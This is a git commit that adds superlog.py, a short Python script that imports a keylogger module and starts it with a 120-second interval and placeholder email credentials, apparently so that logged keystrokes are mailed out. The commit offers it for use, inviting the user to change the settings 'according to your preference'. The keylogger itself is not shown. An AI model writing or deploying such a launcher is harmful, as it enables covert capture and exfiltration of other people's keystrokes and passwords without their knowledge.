937e84fd78dfea65b1a0ea9d43c83cb870eac6c9
4lex <the_rudra@aol.com>
2020-11-19 18:33:17 +0800

    superlog.py
    code upload

---
+++ superlog.py
@@ -0,0 +1,5 @@
+#!/usr/bin/env/ python
+import keylogger
+
+my_keylogger = keylogger.Keylogger(120, "your_email@gmail.com", "your_password")  # change according to your preference
+my_keylogger.start()
